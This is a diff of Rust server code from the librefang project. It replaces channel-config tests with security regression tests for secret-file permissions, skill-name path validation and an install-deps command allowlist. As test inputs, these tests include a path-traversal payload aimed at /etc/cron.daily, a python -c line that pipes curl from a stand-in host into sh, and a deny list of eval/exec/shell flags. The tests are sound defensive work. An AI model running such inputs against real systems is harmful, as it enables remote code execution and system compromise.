@@ -6314,7 +6099,9 @@ pub async fn install_extension(
         Err(e) => {
             let err_str = e.to_string();
             let status = match e {
-                librefang_extensions::ExtensionError::NotFound(_) => StatusCode::NOT_FOUND,
+                librefang_types::integration::IntegrationError::NotFound(_) => {
+                    StatusCode::NOT_FOUND
+                }
                 _ => StatusCode::INTERNAL_SERVER_ERROR,
             };
             return (status, Json(serde_json::json!({"error": err_str})));
@@ -6391,8 +6178,7 @@ pub async fn uninstall_extension(
 
     let config_path = state.kernel.home_dir().join("config.toml");
     if let Err(e) = remove_mcp_server_config(&config_path, &server_name) {
-        return ApiErrorResponse::internal(format!("Failed to update config: {e}"))
-            .into_json_tuple();
+        return ApiErrorResponse::internal_scrub(e).into_json_tuple();
     }
 
     // Sync the in-memory config before reload_mcp_servers runs. Otherwise
@@ -6559,123 +6345,11 @@ mod tests {
         }
     }
 
-    /// Regression for #3183: writing a channel section must not destroy
-    /// unrelated provider settings (or the user's comments and key order)
-    /// in `config.toml`. The previous `toml::Value` round-trip rebuilt the
-    /// entire document on every channel write, which dropped comments and
-    /// — combined with the missing `config_write_lock` — could clobber a
-    /// concurrent provider write from `POST /api/config/set`.
-    #[test]
-    fn upsert_channel_config_preserves_unrelated_sections_and_comments() {
-        let tmp = tempfile::tempdir().unwrap();
-        let config_path = tmp.path().join("config.toml");
-        let original = "\
-# Top-of-file comment that must survive channel writes
-api_port = 4545
-
-[providers.nim]
-# NVIDIA NIM provider — issue #3183 repro
-kind = \"openai-compat\"
-base_url = \"https://integrate.api.nvidia.com/v1\"
-api_key_env = \"NIM_API_KEY\"
-
-[channels.discord]
-bot_token_env = \"OLD_DISCORD_TOKEN\"
-";
-        std::fs::write(&config_path, original).unwrap();
-
-        let mut fields: HashMap<String, (String, FieldType)> = HashMap::new();
-        fields.insert(
-            "bot_token_env".to_string(),
-            ("DISCORD_BOT_TOKEN".to_string(), FieldType::Text),
-        );
-        fields.insert(
-            "guild_ids".to_string(),
-            ("123, 456".to_string(), FieldType::List),
-        );
-
-        upsert_channel_config(&config_path, "discord", &fields).expect("upsert should succeed");
-
-        let raw = std::fs::read_to_string(&config_path).unwrap();
-
-        // Provider section must be intact — this is the original bug.
-        assert!(
-            raw.contains("[providers.nim]"),
-            "[providers.nim] section was dropped — got:\n{raw}"
-        );
-        assert!(
-            raw.contains("base_url = \"https://integrate.api.nvidia.com/v1\""),
-            "NIM base_url was dropped — got:\n{raw}"
-        );
-
-        // Comments and the top-level scalar must survive the rewrite.
-        assert!(
-            raw.contains("# Top-of-file comment that must survive channel writes"),
-            "top-level comment was dropped — got:\n{raw}"
-        );
-        assert!(
-            raw.contains("# NVIDIA NIM provider"),
-            "in-section comment was dropped — got:\n{raw}"
-        );
-        assert!(
-            raw.contains("api_port = 4545"),
-            "top-level scalar was dropped — got:\n{raw}"
-        );
-
-        // The new channel fields must be written with correct TOML types
-        // (list of strings, not list of integers — see the FieldType::List
-        // comment about Discord guild snowflakes).
-        #[derive(serde::Deserialize)]
-        struct Discord {
-            bot_token_env: String,
-            guild_ids: Vec<String>,
-        }
-        #[derive(serde::Deserialize)]
-        struct Channels {
-            discord: Discord,
-        }
-        #[derive(serde::Deserialize)]
-        struct Wrapper {
-            channels: Channels,
-        }
-        let parsed: Wrapper = toml::from_str(&raw).expect("config must round-trip");
-        assert_eq!(parsed.channels.discord.bot_token_env, "DISCORD_BOT_TOKEN");
-        assert_eq!(parsed.channels.discord.guild_ids, vec!["123", "456"]);
-    }
-
-    /// Companion to the upsert test: removing a channel must also leave
-    /// every other section untouched.
-    #[test]
-    fn remove_channel_config_preserves_unrelated_sections_and_comments() {
-        let tmp = tempfile::tempdir().unwrap();
-        let config_path = tmp.path().join("config.toml");
-        let original = "\
-# keep me
-[providers.nim]
-kind = \"openai-compat\"
-base_url = \"https://integrate.api.nvidia.com/v1\"
-
-[channels.discord]
-bot_token_env = \"DISCORD_BOT_TOKEN\"
-";
-        std::fs::write(&config_path, original).unwrap();
-
-        remove_channel_config(&config_path, "discord").expect("remove should succeed");
-
-        let raw = std::fs::read_to_string(&config_path).unwrap();
-        assert!(
-            raw.contains("[providers.nim]"),
-            "[providers.nim] was dropped — got:\n{raw}"
-        );
-        assert!(
-            raw.contains("# keep me"),
-            "top-level comment was dropped — got:\n{raw}"
-        );
-        assert!(
-            !raw.contains("[channels.discord]"),
-            "channel section should have been removed — got:\n{raw}"
-        );
-    }
+    // 16 channel-config tests (upsert / remove / append / update /
+    // remove_channel_instance, AoT-conflict guards, legacy-table
+    // promotion) retired alongside the helper functions they
+    // exercised — every channel runs as a sidecar so the `[channels.<x>]`
+    // TOML write path has zero callers.
 
     // ── escape_env_value tests (Bug #3790) ─────────────────────────────────
 
@@ -6720,6 +6394,66 @@ bot_token_env = \"DISCORD_BOT_TOKEN\"
         assert!(!escaped.contains('\n'));
     }
 
+    /// Regression for audit `write-secret-env-toctou`. After a
+    /// successful `write_secret_env`, the resulting file must be
+    /// mode `0o600` from the moment it appears on disk — the
+    /// atomic-rename pattern guarantees the file never exists
+    /// readable-to-other-UIDs even for one syscall.
+    #[cfg(unix)]
+    #[test]
+    fn write_secret_env_yields_mode_0600() {
+        use std::os::unix::fs::PermissionsExt as _;
+        let tmp = tempfile::tempdir().unwrap();
+        let path = tmp.path().join("secrets.env");
+        write_secret_env(&path, "ANTHROPIC_API_KEY", "sk-secret-123").unwrap();
+        let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
+        assert_eq!(
+            mode, 0o600,
+            "secrets.env must be 0o600 immediately after write; got {mode:o}",
+        );
+    }
+
+    /// `remove_secret_env` rewrites the whole file with every
+    /// remaining key — the audit's TOCTOU window applies equally
+    /// to this path, so the post-condition mode must also be 0600.
+    #[cfg(unix)]
+    #[test]
+    fn remove_secret_env_yields_mode_0600() {
+        use std::os::unix::fs::PermissionsExt as _;
+        let tmp = tempfile::tempdir().unwrap();
+        let path = tmp.path().join("secrets.env");
+        write_secret_env(&path, "A", "1").unwrap();
+        write_secret_env(&path, "B", "2").unwrap();
+        // Deliberately clobber the mode to 0644 (the umask default
+        // the pre-fix code left in the window) so the assertion
+        // below proves the post-condition is restored, not just
+        // inherited from the prior write.
+        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).unwrap();
+        remove_secret_env(&path, "A").unwrap();
+        let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
+        assert_eq!(
+            mode, 0o600,
+            "remove_secret_env must restore 0o600 on rewrite; got {mode:o}",
+        );
+    }
+
+    /// The atomic-rename `*.tmp` sibling must not survive a
+    /// successful write. Leaving the temp file would (a) accrete
+    /// litter under `~/.librefang/` and (b) leave the previous
+    /// secret value readable from the `.tmp` inode until the next
+    /// write overwrites it.
+    #[test]
+    fn write_secret_env_cleans_up_tmp_file() {
+        let tmp = tempfile::tempdir().unwrap();
+        let path = tmp.path().join("secrets.env");
+        write_secret_env(&path, "OPENAI_API_KEY", "sk-1").unwrap();
+        let tmp_path = path.with_file_name("secrets.env.tmp");
+        assert!(
+            !tmp_path.exists(),
+            "tmp sibling must be gone after atomic rename completes",
+        );
+    }
+
     #[test]
     fn write_secret_env_value_with_newline_is_rejected() {
         // Implementation tightened to reject newlines in the value rather
@@ -6727,7 +6461,8 @@ bot_token_env = \"DISCORD_BOT_TOKEN\"
         // (see this test's previous name) but it left a real injection
         // surface for callers that didn't expect dotenv parsers to honour
         // backslash sequences.  Now we fail-closed: caller must sanitise
-        // before passing.
+        // before passing. (`write_service_account_env` was folded into the
+        // generic `write_secret_env` when google_chat/webhook moved out.)
         let tmp = tempfile::tempdir().unwrap();
         let path = tmp.path().join("secrets.env");
         let err = write_secret_env(&path, "API_KEY", "val\nwith\nnewlines").unwrap_err();
@@ -6742,305 +6477,253 @@ bot_token_env = \"DISCORD_BOT_TOKEN\"
             "secrets.env must not be created on validation error"
         );
     }
+}
 
-    // ── Channel instance helpers (#4837) ────────────────────────────────
-
-    fn fields_for(values: &[(&str, &str, FieldType)]) -> HashMap<String, (String, FieldType)> {
-        values
-            .iter()
-            .map(|(k, v, ft)| (k.to_string(), (v.to_string(), *ft)))
-            .collect()
-    }
-
-    #[test]
-    fn append_channel_instance_creates_array_of_tables_from_empty() {
-        let tmp = tempfile::tempdir().unwrap();
-        let path = tmp.path().join("config.toml");
-        let f = fields_for(&[
-            ("bot_token_env", "DISCORD_BOT_TOKEN", FieldType::Text),
-            ("default_agent", "support", FieldType::Text),
-        ]);
-        let idx = append_channel_instance(&path, "discord", &f).unwrap();
-        assert_eq!(idx, 0, "first append must land at index 0");
-        let raw = std::fs::read_to_string(&path).unwrap();
-        assert!(
-            raw.contains("[[channels.discord]]"),
-            "first append should write [[channels.discord]] (array of tables): {raw}"
-        );
-        assert!(raw.contains("bot_token_env = \"DISCORD_BOT_TOKEN\""));
-    }
+#[cfg(test)]
+mod skill_identifier_validation {
+    //! Regression guards for the `skill-install-path-traversal` audit
+    //! item. `install_skill` joins both `req.name` and `req.hand`
+    //! onto filesystem paths (`registry/skills/<name>/`,
+    //! `workspaces/hands/<hand>/`), so a missing validator made the
+    //! handler an FS-existence oracle (200 vs 404) and a write
+    //! primitive (`copy_dir_recursive` outside `~/.librefang/skills/`).
+    //! These tests pin the accept / reject envelope of
+    //! `validate_skill_identifier`.
+    use super::validate_skill_identifier;
 
     #[test]
-    fn append_channel_instance_promotes_legacy_single_table() {
-        let tmp = tempfile::tempdir().unwrap();
-        let path = tmp.path().join("config.toml");
-        // Seed with a legacy `[channels.discord]` single-table layout — the
-        // shape produced by every previous version of the dashboard.
-        std::fs::write(
-            &path,
-            "[channels.discord]\nbot_token_env = \"FIRST\"\ndefault_agent = \"alpha\"\n",
-        )
-        .unwrap();
-        let f = fields_for(&[
-            ("bot_token_env", "SECOND", FieldType::Text),
-            ("default_agent", "beta", FieldType::Text),
-        ]);
-        let idx = append_channel_instance(&path, "discord", &f).unwrap();
-        assert_eq!(idx, 1, "appending to single table should land at index 1");
-
-        let raw = std::fs::read_to_string(&path).unwrap();
-        // Must now be an array-of-tables — the single-table form cannot
-        // coexist with a second instance.
-        assert!(
-            raw.contains("[[channels.discord]]"),
-            "single Table must be promoted to ArrayOfTables: {raw}"
-        );
-        assert!(
-            raw.contains("FIRST"),
-            "legacy entry must be preserved: {raw}"
-        );
-        assert!(raw.contains("SECOND"), "new entry must be present: {raw}");
-
-        // Round-trip through the typed config to make sure the kernel will
-        // see both instances post-promotion.
-        #[derive(serde::Deserialize)]
-        struct Doc {
-            channels: librefang_types::config::ChannelsConfig,
-        }
-        let parsed: Doc = toml::from_str(&raw).unwrap();
-        assert_eq!(parsed.channels.discord.len(), 2);
-    }
-
-    #[test]
-    fn append_channel_instance_pushes_to_existing_array() {
-        let tmp = tempfile::tempdir().unwrap();
-        let path = tmp.path().join("config.toml");
-        std::fs::write(
-            &path,
-            "[[channels.discord]]\nbot_token_env = \"A\"\n\n[[channels.discord]]\nbot_token_env = \"B\"\n",
-        )
-        .unwrap();
-        let f = fields_for(&[("bot_token_env", "C", FieldType::Text)]);
-        let idx = append_channel_instance(&path, "discord", &f).unwrap();
-        assert_eq!(idx, 2, "third instance must land at index 2");
-        let raw = std::fs::read_to_string(&path).unwrap();
-        for needle in ["\"A\"", "\"B\"", "\"C\""] {
-            assert!(raw.contains(needle), "{needle} must be present: {raw}");
+    fn accepts_simple_names() {
+        for ok in ["weather", "weather-v2", "a", "Abc_DEF-123", "skill_42"] {
+            assert!(
+                validate_skill_identifier(ok, "name").is_ok(),
+                "expected '{ok}' to validate",
+            );
         }
     }
 
     #[test]
-    fn update_channel_instance_replaces_array_entry_at_index() {
-        let tmp = tempfile::tempdir().unwrap();
-        let path = tmp.path().join("config.toml");
-        std::fs::write(
-            &path,
-            "[[channels.discord]]\nbot_token_env = \"A\"\n\n[[channels.discord]]\nbot_token_env = \"B\"\n",
-        )
-        .unwrap();
-        let f = fields_for(&[
-            ("bot_token_env", "B_UPDATED", FieldType::Text),
-            ("default_agent", "ops", FieldType::Text),
-        ]);
-        update_channel_instance(&path, "discord", 1, &f).unwrap();
-        let raw = std::fs::read_to_string(&path).unwrap();
-        assert!(raw.contains("\"A\""), "instance 0 must be preserved: {raw}");
+    fn rejects_dot_dot_traversal() {
+        let err = validate_skill_identifier("..", "name").unwrap_err();
+        assert!(err.contains("invalid skill name"), "got {err:?}");
+    }
+
+    #[test]
+    fn rejects_relative_traversal_payload() {
+        // The exploit literal from the audit doc.
+        let err = validate_skill_identifier("../../../etc/cron.daily/payload", "name").unwrap_err();
+        assert!(err.contains("invalid skill name"), "got {err:?}");
+    }
+
+    #[test]
+    fn rejects_forward_slash() {
+        let err = validate_skill_identifier("foo/bar", "name").unwrap_err();
+        assert!(err.contains("invalid skill name"), "got {err:?}");
+    }
+
+    #[test]
+    fn rejects_backslash() {
+        let err = validate_skill_identifier("foo\\bar", "name").unwrap_err();
+        assert!(err.contains("invalid skill name"), "got {err:?}");
+    }
+
+    #[test]
+    fn rejects_leading_dot() {
+        let err = validate_skill_identifier(".hidden", "name").unwrap_err();
         assert!(
-            raw.contains("B_UPDATED"),
-            "instance 1 must reflect update: {raw}"
-        );
-        assert!(
-            !raw.contains("\"B\"\n"),
-            "old instance 1 value must be gone: {raw}"
+            err.contains("invalid skill name"),
+            "leading-dot dotfile must be rejected; got {err:?}",
         );
     }
 
     #[test]
-    fn update_channel_instance_replaces_legacy_single_table() {
-        let tmp = tempfile::tempdir().unwrap();
-        let path = tmp.path().join("config.toml");
-        std::fs::write(&path, "[channels.discord]\nbot_token_env = \"OLD\"\n").unwrap();
-        let f = fields_for(&[("bot_token_env", "NEW", FieldType::Text)]);
-        update_channel_instance(&path, "discord", 0, &f).unwrap();
-        let raw = std::fs::read_to_string(&path).unwrap();
-        assert!(
-            raw.contains("NEW"),
-            "legacy single-table edit at idx 0 should land: {raw}"
-        );
-        assert!(!raw.contains("OLD"), "legacy value must be replaced: {raw}");
-    }
-
-    #[test]
-    fn update_channel_instance_out_of_bounds_errors() {
-        let tmp = tempfile::tempdir().unwrap();
-        let path = tmp.path().join("config.toml");
-        std::fs::write(&path, "[[channels.discord]]\nbot_token_env = \"A\"\n").unwrap();
-        let f = fields_for(&[("bot_token_env", "X", FieldType::Text)]);
-        let err = update_channel_instance(&path, "discord", 5, &f).unwrap_err();
-        assert!(
-            err.to_string().contains("out of bounds"),
-            "out-of-range update should error: {err}"
-        );
-    }
-
-    #[test]
-    fn update_channel_instance_unknown_channel_errors() {
-        let tmp = tempfile::tempdir().unwrap();
-        let path = tmp.path().join("config.toml");
-        std::fs::write(&path, "[other]\nx = 1\n").unwrap();
-        let f = fields_for(&[("bot_token_env", "X", FieldType::Text)]);
-        let err = update_channel_instance(&path, "discord", 0, &f).unwrap_err();
-        assert!(
-            err.to_string().contains("not configured"),
-            "unconfigured channel update should error: {err}"
-        );
-    }
-
-    #[test]
-    fn remove_channel_instance_drops_one_array_entry() {
-        let tmp = tempfile::tempdir().unwrap();
-        let path = tmp.path().join("config.toml");
-        std::fs::write(
-            &path,
-            "[[channels.discord]]\nbot_token_env = \"A\"\n\n[[channels.discord]]\nbot_token_env = \"B\"\n\n[[channels.discord]]\nbot_token_env = \"C\"\n",
-        )
-        .unwrap();
-        remove_channel_instance(&path, "discord", 1).unwrap();
-        let raw = std::fs::read_to_string(&path).unwrap();
-        assert!(raw.contains("\"A\""));
-        assert!(raw.contains("\"C\""));
-        assert!(
-            !raw.contains("\"B\""),
-            "removed instance must be gone: {raw}"
-        );
-
-        #[derive(serde::Deserialize)]
-        struct Doc {
-            channels: librefang_types::config::ChannelsConfig,
+    fn rejects_leading_hyphen_and_underscore() {
+        for bad in ["-foo", "_foo"] {
+            let err = validate_skill_identifier(bad, "name").unwrap_err();
+            assert!(
+                err.contains("must start with"),
+                "leading non-alphanumeric '{bad}' must be rejected; got {err:?}",
+            );
         }
-        let parsed: Doc = toml::from_str(&raw).unwrap();
-        assert_eq!(parsed.channels.discord.len(), 2);
     }
 
     #[test]
-    fn remove_channel_instance_drops_section_when_array_empties() {
-        let tmp = tempfile::tempdir().unwrap();
-        let path = tmp.path().join("config.toml");
-        std::fs::write(&path, "[[channels.discord]]\nbot_token_env = \"ONLY\"\n").unwrap();
-        remove_channel_instance(&path, "discord", 0).unwrap();
-        let raw = std::fs::read_to_string(&path).unwrap();
-        // Either the channels.discord entry is gone entirely, or the channels
-        // table itself is empty — both forms parse back to zero instances.
-        #[derive(serde::Deserialize, Default)]
-        struct Doc {
-            #[serde(default)]
-            channels: librefang_types::config::ChannelsConfig,
+    fn rejects_empty() {
+        let err = validate_skill_identifier("", "name").unwrap_err();
+        assert!(err.contains("invalid skill name"), "got {err:?}");
+    }
+
+    #[test]
+    fn rejects_too_long() {
+        let long = "a".repeat(65);
+        let err = validate_skill_identifier(&long, "name").unwrap_err();
+        assert!(
+            err.contains("1-64"),
+            "expected 1-64 length message; got {err:?}"
+        );
+    }
+
+    #[test]
+    fn rejects_non_ascii() {
+        // Unicode lookalikes (Cyrillic 'а' vs Latin 'a') would be a
+        // confusable-character attack vector. The validator is
+        // ASCII-only on purpose.
+        let err = validate_skill_identifier("\u{0430}weather", "name").unwrap_err();
+        assert!(err.contains("invalid skill name"), "got {err:?}");
+    }
+
+    #[test]
+    fn rejects_dots_inside_name() {
+        // `foo.bar` is rejected — dots have no place in skill ids
+        // (no extensions, no namespacing). Audit doc was explicit
+        // about leading-dot rejection; this extends to mid-string
+        // dots for defence in depth (path-normalisation edge cases
+        // with `./` segments).
+        let err = validate_skill_identifier("foo.bar", "name").unwrap_err();
+        assert!(err.contains("invalid skill name"), "got {err:?}");
+    }
+
+    #[test]
+    fn field_label_propagates_to_error_message() {
+        // When the validator is called on `hand`, the error must
+        // say "hand" so the client knows which payload field to
+        // fix. The handler relies on this to keep client errors
+        // actionable across both inputs.
+        let err = validate_skill_identifier("../oops", "hand").unwrap_err();
+        assert!(
+            err.contains("invalid skill hand"),
+            "expected 'hand' in message; got {err:?}",
+        );
+    }
+}
+
+#[cfg(test)]
+mod install_deps_argv_validation {
+    //! Regression guards for the `install-deps-rce-admin` audit item.
+    //!
+    //! `POST /api/hands/{hand_id}/install-deps` ran `Command::new(parts[0])`
+    //! against `install_deps` strings authored by Admin in HAND.toml. The
+    //! historical guard was a metacharacter blocklist (`;|&$\`><(){}\n\r`)
+    //! which an Admin could bypass with
+    //!     `install_deps = ["python", "-c", "import os; os.system('curl …')"]`
+    //! because the punctuation lives inside the quoted `-c` argument and
+    //! the top-level command string has none of the blocked characters.
+    //! This module pins the new (program-allowlist + flag-denylist)
+    //! envelope of `validate_install_deps_argv`.
+    use super::validate_install_deps_argv;
+
+    #[test]
+    fn accepts_legitimate_package_manager_commands() {
+        // Each entry mirrors a realistic per-platform `install_deps`
+        // string the handler would otherwise have rejected.
+        let ok = [
+            ("pip", vec!["install", "requests"]),
+            ("pip3", vec!["install", "--user", "yt-dlp"]),
+            ("npm", vec!["install", "-g", "typescript"]),
+            ("apt", vec!["install", "-y", "ffmpeg"]),
+            ("apt-get", vec!["install", "-y", "curl"]),
+            ("dnf", vec!["install", "-y", "ffmpeg"]),
+            ("pacman", vec!["-S", "--noconfirm", "ffmpeg"]),
+            ("brew", vec!["install", "ffmpeg"]),
+            (
+                "winget",
+                vec![
+                    "install",
+                    "Gyan.FFmpeg",
+                    "--accept-source-agreements",
+                    "--accept-package-agreements",
+                ],
+            ),
+            ("cargo", vec!["install", "ripgrep"]),
+        ];
+        for (prog, args) in ok {
+            assert!(
+                validate_install_deps_argv(prog, &args).is_ok(),
+                "expected '{prog} {args:?}' to validate"
+            );
         }
-        let parsed: Doc = toml::from_str(&raw).unwrap_or_default();
-        assert_eq!(parsed.channels.discord.len(), 0);
     }
 
     #[test]
-    fn remove_channel_instance_drops_legacy_single_table() {
-        let tmp = tempfile::tempdir().unwrap();
-        let path = tmp.path().join("config.toml");
-        std::fs::write(&path, "[channels.discord]\nbot_token_env = \"OLD\"\n").unwrap();
-        remove_channel_instance(&path, "discord", 0).unwrap();
-        let raw = std::fs::read_to_string(&path).unwrap();
-        assert!(
-            !raw.contains("bot_token_env"),
-            "legacy single-table delete at idx 0 must remove the section: {raw}"
-        );
-    }
-
-    #[test]
-    fn remove_channel_instance_out_of_bounds_errors() {
-        let tmp = tempfile::tempdir().unwrap();
-        let path = tmp.path().join("config.toml");
-        std::fs::write(&path, "[[channels.discord]]\nbot_token_env = \"A\"\n").unwrap();
-        let err = remove_channel_instance(&path, "discord", 7).unwrap_err();
-        assert!(
-            err.to_string().contains("out of bounds"),
-            "out-of-range remove should error: {err}"
-        );
-    }
-
-    /// Regression for #4865: legacy `POST /api/channels/<name>/configure`
-    /// silently replaced the entire `[[channels.<name>]]` array with a
-    /// single `[channels.<name>]` table, losing every instance after the
-    /// first. The helper must refuse with the AoT-conflict sentinel so the
-    /// handler can map to 409 Conflict.
-    #[test]
-    fn upsert_channel_config_refuses_when_aot_exists() {
-        let tmp = tempfile::tempdir().unwrap();
-        let path = tmp.path().join("config.toml");
-        std::fs::write(
-            &path,
-            "[[channels.discord]]\nbot_token_env = \"TG_A\"\n\n\
-             [[channels.discord]]\nbot_token_env = \"TG_B\"\n",
+    fn rejects_dash_c_payload_under_allowlisted_interpreter_alias() {
+        // The historical exploit literal from the audit doc. `python`
+        // is not allowlisted, so this fails at the program check first.
+        let err = validate_install_deps_argv(
+            "python",
+            &["-c", "import os; os.system('curl evil.sh | sh')"],
         )
-        .unwrap();
-        let mut fields: HashMap<String, (String, FieldType)> = HashMap::new();
-        fields.insert(
-            "bot_token_env".to_string(),
-            ("TG_REPLACEMENT".to_string(), FieldType::Text),
-        );
-        let err = upsert_channel_config(&path, "discord", &fields).unwrap_err();
-        let msg = err.to_string();
-        assert!(
-            msg.starts_with(CHANNEL_AOT_CONFLICT_PREFIX),
-            "expected AoT-conflict sentinel, got: {msg}"
-        );
-        // Disk must be untouched — both original instances still present.
-        let raw = std::fs::read_to_string(&path).unwrap();
-        assert!(raw.contains("TG_A"), "instance A was clobbered: {raw}");
-        assert!(raw.contains("TG_B"), "instance B was clobbered: {raw}");
-        assert!(
-            !raw.contains("TG_REPLACEMENT"),
-            "refused write must not appear on disk: {raw}"
-        );
+        .unwrap_err();
+        assert!(err.contains("not in install-deps allowlist"), "got {err:?}");
+
+        // …and even if a future allowlist entry slips an interpreter in
+        // (regression guard), the `-c` flag check stops the payload.
+        // We pick `pip` as a stand-in: `pip -c …` is meaningless but
+        // proves the flag check fires independent of the program.
+        let err = validate_install_deps_argv("pip", &["-c", "anything"]).unwrap_err();
+        assert!(err.contains("disallowed flag"), "got {err:?}");
+        assert!(err.contains("-c"), "got {err:?}");
     }
 
-    /// Regression for #4865: `DELETE /api/channels/<name>/configure` would
-    /// drop the entire `[[channels.<name>]]` array, including instances the
-    /// user had created via the per-instance API. Helper must refuse.
     #[test]
-    fn remove_channel_config_refuses_when_aot_exists() {
-        let tmp = tempfile::tempdir().unwrap();
-        let path = tmp.path().join("config.toml");
-        std::fs::write(
-            &path,
-            "[[channels.discord]]\nbot_token_env = \"TG_A\"\n\n\
-             [[channels.discord]]\nbot_token_env = \"TG_B\"\n",
-        )
-        .unwrap();
-        let err = remove_channel_config(&path, "discord").unwrap_err();
-        let msg = err.to_string();
-        assert!(
-            msg.starts_with(CHANNEL_AOT_CONFLICT_PREFIX),
-            "expected AoT-conflict sentinel, got: {msg}"
-        );
-        let raw = std::fs::read_to_string(&path).unwrap();
-        assert!(raw.contains("TG_A"), "instance A was clobbered: {raw}");
-        assert!(raw.contains("TG_B"), "instance B was clobbered: {raw}");
+    fn rejects_eval_and_exec_flag_variants() {
+        for flag in ["--eval", "--exec", "--shell", "--command", "-e"] {
+            let err = validate_install_deps_argv("npm", &[flag, "code"]).unwrap_err();
+            assert!(
+                err.contains("disallowed flag"),
+                "expected '{flag}' to be rejected; got {err:?}"
+            );
+        }
+        // `=value` long-form variants (e.g. `node --eval=…` style) — the
+        // bare-flag check would miss these since `--eval=foo != --eval`.
+        for combined in [
+            "--exec=touch /tmp/x",
+            "--shell=/bin/sh",
+            "--eval=process.exit(0)",
+            "--command=ls",
+        ] {
+            let err = validate_install_deps_argv("npm", &[combined]).unwrap_err();
+            assert!(
+                err.contains("disallowed flag"),
+                "expected '{combined}' to be rejected; got {err:?}"
+            );
+        }
+        // Case-insensitive: `--EVAL` and friends must still fail. A naive
+        // exact-match check would let an attacker bypass via casing.
+        let err = validate_install_deps_argv("npm", &["--EVAL", "x"]).unwrap_err();
+        assert!(err.contains("disallowed flag"), "got {err:?}");
     }
 
-    /// Single-instance legacy table form must keep working with /configure
-    /// (the back-compat path). The AoT-refusal must NOT trigger when the
-    /// channel is stored as a single table.
     #[test]
-    fn upsert_channel_config_still_replaces_legacy_single_table() {
-        let tmp = tempfile::tempdir().unwrap();
-        let path = tmp.path().join("config.toml");
-        std::fs::write(&path, "[channels.discord]\nbot_token_env = \"OLD\"\n").unwrap();
-        let mut fields: HashMap<String, (String, FieldType)> = HashMap::new();
-        fields.insert(
-            "bot_token_env".to_string(),
-            ("NEW_TOKEN".to_string(), FieldType::Text),
-        );
-        upsert_channel_config(&path, "discord", &fields).expect("legacy single-table replace");
-        let raw = std::fs::read_to_string(&path).unwrap();
-        assert!(raw.contains("NEW_TOKEN"), "replacement must land: {raw}");
-        assert!(!raw.contains("OLD"), "old value must be gone: {raw}");
+    fn rejects_absolute_unix_path() {
+        let err = validate_install_deps_argv("/bin/sh", &["-c", "id"]).unwrap_err();
+        assert!(err.contains("absolute path"), "got {err:?}");
+    }
+
+    #[test]
+    fn rejects_windows_backslash_paths() {
+        // Both the verbatim `\\?\C:\…` shape and a plain
+        // `C:\Windows\…` candidate trip the backslash check before
+        // the allowlist would otherwise miss them.
+        for prog in [
+            r"\\?\C:\Windows\System32\cmd.exe",
+            r"C:\Windows\System32\cmd.exe",
+            r"foo\bar",
+        ] {
+            let err = validate_install_deps_argv(prog, &["/c", "dir"]).unwrap_err();
+            assert!(
+                err.contains("absolute path"),
+                "expected '{prog}' rejected as absolute-path; got {err:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn rejects_non_allowlisted_program() {
+        for prog in ["python", "python3", "node", "ruby", "perl", "bash", "sh"] {
+            let err = validate_install_deps_argv(prog, &["install", "foo"]).unwrap_err();
+            assert!(
+                err.contains("not in install-deps allowlist"),
+                "expected '{prog}' rejected by allowlist; got {err:?}"
+            );
+        }
     }
 }
